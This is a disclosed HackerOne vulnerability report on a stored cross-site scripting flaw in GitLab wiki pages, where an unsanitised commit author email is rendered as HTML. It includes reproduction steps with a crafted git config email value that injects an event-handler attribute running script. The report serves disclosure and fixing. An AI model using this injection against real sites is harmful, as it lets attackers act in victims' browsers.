# Stored-XSS on wiki pages

## Report Details
- **Report ID**: 1087061
- **URL**: https://hackerone.com/reports/1087061
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-25T21:21:47.404Z
- **Disclosed**: 2021-07-13T08:35:54.633Z

## Reporter
- **Username**: yvvdwf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Hello,

A Stored-XSS is existing on Wiki pages. It is caused by recent change in [show.html.haml#L10](https://gitlab.com/gitlab-org/gitlab/blob/3e543192b1179c79e0a44ae6f32648fa7155c10e/app/views/shared/wikis/show.html.haml#L10)

```ruby
       ... "<a href='#{@page.last_version.author_url}'>".html_safe ...
```

`author_url` is defined by committed email in [wiki_page_version.rb](https://gitlab.com/gitlab-org/gitlab/blob/3e543192b1179c79e0a44ae6f32648fa7155c10e/lib/gitlab/git/wiki_page_version.rb):

```ruby
     delegate :message, :sha, :id, :author_name, :author_email, :authored_date, to: :commit

      def author_url
        user = ::User.find_by_any_email(author_email)
        user.nil? ? "mailto:#{author_email}" : Gitlab::UrlBuilder.build(user)
      end
```

Since the `author_url`is considered as `safe`, attackers may inject any DOM attributes of `<a>` tag. 


### Steps to reproduce

1. Clone wiki repository of an existing project or a new one, for example: `git clone git@gl.local:root/test.wiki.git`
2. Go to inside `test.wiki` directory, then add the 3 following lines at then end of  `.git/config` file (if there exists `[user]` section in `.git/config`, then replace its section by the following lines):

```
[user]
	name = anyname
	email = "#' style=animation-name:blinking-dot onanimationstart=alert(document.domain) other"
```

3.  Modify/create any wiki page, for example: `echo "Hi" >> home.md`
4. Commit the modification and push it into gitlab server
5. Open the wiki page in Web browser,  http://gl.local/hi/test/-/wikis/home, you should see the alert

### Impact

XSS may allows attackers to perform any actions on behalf of victims at client side.


### What is the current *bug* behavior?

`author_url` is not sanitized

### What is the expected *correct* behavior?

`author_url`  should be sanitized

### Output of checks

#### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

```
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	5.0.9
Git Version:	2.29.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.8.0-ee
Revision:	1ae10d09692
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.4
URL:		http://gl.local
HTTP Clone URL:	http://gl.local/some-group/some-project.git
SSH Clone URL:	git@gl.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	13.15.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

XSS may allows attackers to perform any actions on behalf of victims at client side.

## Attachments
No attachments
